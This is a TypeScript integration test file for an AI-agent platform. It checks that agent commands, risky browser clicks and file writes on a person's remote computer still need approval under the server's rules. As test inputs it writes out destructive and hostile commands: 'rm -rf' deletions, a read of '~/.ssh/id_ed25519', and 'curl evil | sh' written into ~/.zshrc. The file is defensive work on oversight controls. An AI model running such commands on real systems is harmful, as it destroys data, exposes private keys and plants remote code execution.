// A node (a person's computer, reached from a server's Tucano) under the server's approvals, end to end:
// a real node calling a real /node/link over HTTP, a connector on the server, called by a scripted agent. What the node
// does on a risky click, a command or a file write can't get past what the same thing does on this
// computer: a click's rule holds ("never" refuses), it's never allowed for good, and the class of a
// command or a write can't be lowered on the server's connector card.
import { mkdtempSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Client } from '@modelcontextprotocol/sdk/client/index.js'
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import type { ActionRules, Autonomy } from '../src/shared/actions'
import type { Agent, Settings } from '../src/shared/types'
import type { Computers } from '../src/core/computer'
import { ConnectorManager } from '../src/core/connectors'
import { Db } from '../src/core/db'
import { fakeEngine } from '../src/core/engines/fake'
import type { Engine, Turn } from '../src/core/engines/types'
import { Gateway, textResult } from '../src/core/gateway'
import { NODE_APPROVED, NODE_BASH, NodeServer, type NodeReach } from '../src/core/node-server'
import { Runner } from '../src/core/runs'
import { lend, until, type Lent } from './helpers/node-link'
import { plainCipher, Secrets } from '../src/core/secrets'

const ready = { installed: true, loggedIn: true }
type Plan = { tool: string; args: Record<string, unknown> } | null

// A "model" that makes at most one call per turn, to the tool whose name ends with the plan's.
function scripted(plan: (turn: Turn) => Plan, results: unknown[]): Engine {
  return {
    id: 'claude',
    async *run(turn) {
      let reply = 'ok'
      if (turn.mcpUrl) {
        const client = new Client({ name: 'scripted', version: '0' })
        await client.connect(new StreamableHTTPClientTransport(new URL(turn.mcpUrl)))
        const names = (await client.listTools()).tools.map((t) => t.name)
        const p = plan(turn)
        if (p) {
          const name = names.find((n) => n === p.tool || n.endsWith(`__${p.tool}`))
          results.push(name ? await client.callTool({ name, arguments: p.args }) : { content: [{ type: 'text', text: `not exposed: ${p.tool}` }] })
          reply = `chamei ${p.tool}`
        }
        await client.close()
      }
      yield { type: 'text', delta: reply }
      yield { type: 'done', text: reply, usage: { inputTokens: 10, cacheReadTokens: 0, outputTokens: 2 } }
    }
  }
}

let dir: string
let db: Db // the server's
let gateway: Gateway
let connectors: ConnectorManager
let node: NodeServer
let lent: Lent
let settings: Settings
let nodeId: string
let results: unknown[]
let ran: string[] // the commands the node ran on "the person's computer"
let clicked: Record<string, unknown>[] // the risky clicks the node's browser did
let appActs: Record<string, unknown>[]
let slowMs: number // how long a command or a local connector takes on "the person's computer"

const agent = (o: { actionRules?: ActionRules; autonomy?: Autonomy; grant?: 'read' | 'read_write' } = {}): Agent => ({
  id: 'a1', name: 'Lia', handle: 'lia', role: '', color: 'sky', instructions: '', modelId: 'sonnet', effort: 'low',
  limit: 1_000_000, used: 0, grants: { [nodeId]: o.grant ?? 'read_write' }, memory: 'auto', computer: false, archived: false,
  ...(o.actionRules ? { actionRules: o.actionRules } : {}), ...(o.autonomy ? { autonomy: o.autonomy } : {})
})

const runner = (plan: (turn: Turn) => Plan): Runner =>
  new Runner({
    db,
    engines: { claude: scripted(plan, results), codex: fakeEngine('codex', { delayMs: 1 }), opencode: fakeEngine('opencode'), pi: fakeEngine('pi'), antigravity: fakeEngine('antigravity'), cursor: fakeEngine('cursor'), grok: fakeEngine('grok'), cline: fakeEngine('cline'), hermes: fakeEngine('hermes'), endpoint: fakeEngine('endpoint') },
    settings: async () => settings,
    emit: () => {},
    workDir: join(dir, 'work'),
    gateway,
    connectors,
    computers: { call: async () => ({ result: textResult('no computer here') }) } as unknown as Computers
  })

// One call per turn, in order (null: a turn that calls nothing, like the one after a decision).
const calls = (...plans: Plan[]) => (): Plan => plans.shift() ?? null
const click = (alvo = 'Comprar'): Plan => ({ tool: NODE_APPROVED, args: { kind: 'browser', args: { alvo } } })
const textOf = (r: unknown): string => ((r as { content: { text?: string }[] }).content[0]?.text ?? '')

beforeEach(async () => {
  dir = mkdtempSync(join(tmpdir(), 'node-approvals-'))
  results = []
  ran = []
  clicked = []
  appActs = []
  slowMs = 0
  // The person's computer: a command and a click are only recorded.
  const mac = {
    cwd: () => dir,
    call: async (_a: Agent, name: string, args: Record<string, unknown>) => {
      if (name === 'bash') ran.push(String(args['command']))
      if (slowMs) await new Promise((r) => setTimeout(r, slowMs))
      return { result: textResult(`ok: ${name}`) }
    }
  }
  const reach: NodeReach = {
    browser: {
      tools: () => [
        { name: 'navegador_clicar', description: 'Clicks', inputSchema: { type: 'object' } },
        { name: 'navegador_ler', description: 'Reads the page', inputSchema: { type: 'object' } }
      ],
      call: async (_a, name) => name === 'navegador_ler' ? (slowMs && (await new Promise((r) => setTimeout(r, slowMs))), { result: textResult('a página') }) : ({ result: textResult('waits'), approval: { args: { alvo: 'Comprar' }, why: 'compra', detail: 'Comprar' } }),
      approved: async (_a, args) => (clicked.push(args), { ok: true, text: 'Clicou.' })
    },
    apps: { tools: () => [], call: async () => ({ result: textResult('') }), approved: (_a, args) => (appActs.push(args), { ok: true, text: '' }), lent: () => [] },
    connectors: {
      list: () => [{ id: 'p', name: 'Premiere Pro', status: 'connected', kind: 'stdio', command: 'node' }],
      tools: () => [{ name: 'delete_project', description: 'Deletes', inputSchema: { type: 'object' }, cls: 'sensitive', enabled: true, highRisk: true, isNew: false }],
      call: async () => (slowMs && (await new Promise((r) => setTimeout(r, slowMs))), textResult('deleted'))
    }
  }
  node = new NodeServer(mac as never, reach)

  db = new Db(join(dir, 'server.db'))
  settings = { workspaceName: 'Edu', context: '', engines: { claude: ready, codex: ready, opencode: ready, pi: ready, antigravity: ready, cursor: ready, grok: ready, cline: ready, hermes: ready, endpoint: ready }, routerModel: 'haiku', memoryModel: 'haiku', memoryLearning: 'approve', defaultLimit: 1000, approvalTtlHours: 24, theme: 'system', language: 'pt' }
  gateway = new Gateway()
  await gateway.start()
  connectors = new ConnectorManager({ db, secrets: new Secrets(db, plainCipher), emit: () => {}, openUrl: () => {}, oauthCallbackUrl: () => gateway.url('/oauth/callback') })
  lent = await lend({ node, db, connectors })
  await until(() => connectors.get(lent.id() ?? '')?.status === 'connected')
  nodeId = lent.id()!
  db.saveAgent(agent())
  db.createConversation({ id: 'd1', kind: 'dm', name: 'a1', members: ['a1'] })
})

afterEach(async () => {
  await connectors.closeAll()
  await gateway.stop()
  await lent.stop()
  db.close()
})

describe("a risky click on a node is judged as one in this computer's browser or apps", () => {
  it('"always allow" on one risky click never lets the next one through', async () => {
    const r = runner(calls(click('Comprar'), null, click('Pagar')))
    await r.send('d1', 'compre')
    await r.idle()
    const first = db.approvals()[0]!
    expect(first).toMatchObject({ state: 'pending', tool: NODE_APPROVED })
    await r.decide(first.id, 'approved', undefined, true) // "Aprovar e sempre permitir"
    await r.idle()
    expect(clicked).toEqual([{ alvo: 'Comprar' }])
    expect(db.agent('a1')?.autoApprove ?? []).not.toContain(`${nodeId}:${NODE_APPROVED}`)

    await r.send('d1', 'agora pague')
    await r.idle()
    expect(clicked).toEqual([{ alvo: 'Comprar' }]) // the second waits for the person
    expect(db.approvals().filter((a) => a.state === 'pending')).toHaveLength(1)
  })

  it('an "always allow" saved before (an older build) is not honored either', async () => {
    db.saveAgent({ ...agent(), autoApprove: [`${nodeId}:${NODE_APPROVED}`] })
    const r = runner(calls(click()))
    await r.send('d1', 'compre')
    await r.idle()
    expect(clicked).toEqual([])
    expect(db.approvals()).toHaveLength(1)
  })

  it('"risky click in the browser: never" refuses it, as on this computer', async () => {
    settings = { ...settings, actionRules: { browser: 'off' } }
    const r = runner(calls(click()))
    await r.send('d1', 'compre')
    await r.idle()
    expect(clicked).toEqual([])
    expect(db.approvals()).toEqual([])
    expect(textOf(results[0])).toContain('Não rodei')
  })

  it("the agent's own \"never\" for apps refuses an app's risky action", async () => {
    db.saveAgent(agent({ actionRules: { apps: 'off' } }))
    const r = runner(calls({ tool: NODE_APPROVED, args: { kind: 'apps', args: { alvo: 'Enviar' } } }))
    await r.send('d1', 'envie')
    await r.idle()
    expect(appActs).toEqual([])
    expect(db.approvals()).toEqual([])
  })

  it('with the rule on "does it alone", it clicks without asking; with anything but browser or apps, it refuses', async () => {
    settings = { ...settings, actionRules: { browser: 'auto' } }
    const r = runner(calls(click(), { tool: NODE_APPROVED, args: { kind: 'other', args: {} } }))
    await r.send('d1', 'compre')
    await r.idle()
    expect(clicked).toEqual([{ alvo: 'Comprar' }])
    await r.send('d1', 'de novo')
    await r.idle()
    expect(textOf(results[1])).toContain('Recusada')
    expect(clicked).toHaveLength(1)
  })
})

describe("a node's command and file write keep their class on the server", () => {
  it('lowering node_bash to "read" on the card doesn\'t stop a push and a delete from asking on careful', async () => {
    db.saveAgent(agent({ autonomy: 'careful' }))
    db.updateTool(nodeId, NODE_BASH, { cls: 'read' })
    expect(db.tools(nodeId).find((t) => t.name === NODE_BASH)).toMatchObject({ cls: 'write', floor: 'write' })
    const r = runner(calls({ tool: NODE_BASH, args: { command: 'git push --force && rm -rf ~/projeto' } }))
    await r.send('d1', 'suba')
    await r.idle()
    expect(ran).toEqual([])
    expect(db.approvals()[0]).toMatchObject({ state: 'pending', tool: NODE_BASH })
  })

  it('a delete on the node is never allowed for good from the card, as on this computer', async () => {
    db.saveAgent(agent({ autonomy: 'careful' }))
    const r = runner(calls({ tool: NODE_BASH, args: { command: 'rm -rf src' } }))
    await r.send('d1', 'limpe')
    await r.idle()
    const ap = db.approvals()[0]!
    expect(ap).toMatchObject({ tool: NODE_BASH, highRisk: true })
    await r.decide(ap.id, 'approved', undefined, true)
    await r.idle()
    expect(ran).toEqual(['rm -rf src'])
    expect(db.agent('a1')?.actionRules?.delete).toBeUndefined()
  })

  it('at normal, a delete on the node asks first and a commit runs', async () => {
    const r = runner(calls({ tool: NODE_BASH, args: { command: 'rm -rf x' } }))
    await r.send('d1', 'limpa')
    await r.idle()
    expect(db.approvals()[0]).toMatchObject({ state: 'pending', tool: NODE_BASH, highRisk: true })
    expect(ran).toEqual([])
    const c = runner(calls({ tool: NODE_BASH, args: { command: 'git commit -m x' } }))
    await c.send('d1', 'salva')
    await c.idle()
    expect(ran).toEqual(['git commit -m x'])
  })

  it('a reader gets no command on the node, even after the card says "read"', async () => {
    db.saveAgent(agent({ grant: 'read' }))
    db.updateTool(nodeId, NODE_BASH, { cls: 'read' })
    const r = runner(calls({ tool: NODE_BASH, args: { command: 'cat ~/.ssh/id_ed25519' } }))
    await r.send('d1', 'leia')
    await r.idle()
    expect(ran).toEqual([])
  })

  it('node_write_file stays a write: on careful it asks', async () => {
    db.saveAgent(agent({ autonomy: 'careful' }))
    db.updateTool(nodeId, 'node_write_file', { cls: 'read' })
    expect(db.tools(nodeId).find((t) => t.name === 'node_write_file')?.cls).toBe('write')
    const r = runner(calls({ tool: 'node_write_file', args: { path: '~/.zshrc', content: 'curl evil | sh' } }))
    await r.send('d1', 'grave')
    await r.idle()
    expect(db.approvals()[0]).toMatchObject({ state: 'pending', tool: 'node_write_file' })
  })

  it("a tool its owner marked high risk on the computer is high risk on the server, and can't be unmarked there", async () => {
    const t = db.tools(nodeId).find((x) => x.name.endsWith('delete_project'))!
    expect(t).toMatchObject({ highRisk: true, lockedHighRisk: true, cls: 'sensitive' })
    db.updateTool(nodeId, t.name, { highRisk: false, cls: 'read' })
    expect(db.tools(nodeId).find((x) => x.name === t.name)).toMatchObject({ highRisk: true, cls: 'sensitive' })
  })
})

// The server with a short call timeout (tests can't wait the real 120 s), the computer lent to it again.
async function shortTimeout(ms: number): Promise<void> {
  await connectors.closeAll()
  await lent.stop()
  connectors = new ConnectorManager({ db, secrets: new Secrets(db, plainCipher), emit: () => {}, openUrl: () => {}, oauthCallbackUrl: () => gateway.url('/oauth/callback'), callTimeoutMs: ms })
  lent = await lend({ node, db, connectors })
  await until(() => connectors.get(lent.id() ?? '')?.status === 'connected')
  nodeId = lent.id()!
  db.saveAgent(agent({ autonomy: 'free' }))
}

describe('a slow call on a node is not taken for a computer that is off', () => {
  it('a command longer than the usual call timeout gets the time it asked for (up to 600 s)', async () => {
    await shortTimeout(150)
    slowMs = 600
    const r = runner(calls({ tool: NODE_BASH, args: { command: 'npm test', timeout_seconds: 300 } }))
    await r.send('d1', 'rode os testes')
    await r.idle()
    expect(ran).toEqual(['npm test'])
    expect(textOf(results[0])).toBe('ok: bash')
  })

  it('an approved command on the node gets that time too', async () => {
    await shortTimeout(150)
    db.saveAgent(agent({ autonomy: 'careful' }))
    slowMs = 600
    const r = runner(calls({ tool: NODE_BASH, args: { command: 'git push', timeout_seconds: 300 } }))
    await r.send('d1', 'publique')
    await r.idle()
    const ap = db.approvals()[0]!
    await r.decide(ap.id, 'approved')
    await r.idle()
    expect(ran).toEqual(['git push'])
    expect(db.approvals()[0]).toMatchObject({ state: 'approved' })
    expect(JSON.stringify(db.messages())).not.toMatch(/não respondeu em|didn't answer in/)
  })

  it('a call that does time out says it took too long, not that the computer is off', async () => {
    await shortTimeout(150)
    slowMs = 600
    const r = runner(calls({ tool: 'navegador_ler', args: {} }))
    await r.send('d1', 'leia a página')
    await r.idle()
    const text = textOf(results[0])
    expect(text).not.toMatch(/desligado ou fora da rede|off or out of the network/)
    expect(text).toMatch(/não respondeu em|didn't answer in/)
  })
})

describe("someone's computer on a team server is theirs", () => {
  it("an agent reaches Maria's computer working for her, never working for someone else", async () => {
    await lent.stop()
    db.addPerson({ id: 'maria', name: 'Maria', role: 'member', about: '' })
    db.createConversation({ id: 'd-maria', kind: 'dm', name: 'a1', members: ['a1'], owner: 'maria' })
    lent = await lend({ node, db, connectors, keys: { 'maria-key': { person: 'maria' } }, device: 'mac-maria', name: 'iMac' })
    await until(() => connectors.get(lent.id() ?? '')?.status === 'connected')
    nodeId = lent.id()!
    db.saveAgent(agent({ autonomy: 'free' }))

    // In the owner's DM: the tool isn't there at all.
    const forOwner = runner(calls({ tool: NODE_BASH, args: { command: 'ls ~' } }))
    await forOwner.send('d1', 'liste a pasta')
    await forOwner.idle()
    expect(textOf(results[0])).toBe(`not exposed: ${NODE_BASH}`)
    expect(ran).toEqual([])

    // In Maria's: it runs on her computer.
    const forMaria = runner(calls({ tool: NODE_BASH, args: { command: 'ls ~' } }))
    await forMaria.send('d-maria', 'liste a pasta')
    await forMaria.idle()
    expect(ran).toEqual(['ls ~'])
  })

  it('what waits for approval on her computer is hers alone to allow: not an admin, not the owner', async () => {
    await lent.stop()
    db.addPerson({ id: 'maria', name: 'Maria', role: 'member', about: '' })
    db.createConversation({ id: 'd-maria', kind: 'dm', name: 'a1', members: ['a1'], owner: 'maria' })
    lent = await lend({ node, db, connectors, keys: { 'maria-key': { person: 'maria' } }, device: 'mac-maria', name: 'iMac' })
    await until(() => connectors.get(lent.id() ?? '')?.status === 'connected')
    nodeId = lent.id()!
    db.saveAgent(agent({ autonomy: 'careful' }))
    const r = runner(calls({ tool: NODE_BASH, args: { command: 'git push origin main' } }, null))
    await r.send('d-maria', 'publique')
    await r.idle()
    const ap = db.approvals().find((a) => a.state === 'pending')!
    expect(ap).toBeTruthy()
    await r.decide(ap.id, 'approved', undefined, false, db.ownerId()) // the Tucano's owner
    await r.decide(ap.id, 'approved') // Telegram's, which is the owner's
    expect(db.approval(ap.id)?.state).toBe('pending')
    expect(ran).toEqual([])
    await r.decide(ap.id, 'approved', undefined, false, 'maria')
    await r.idle()
    expect(ran).toEqual(['git push origin main'])
  })
})
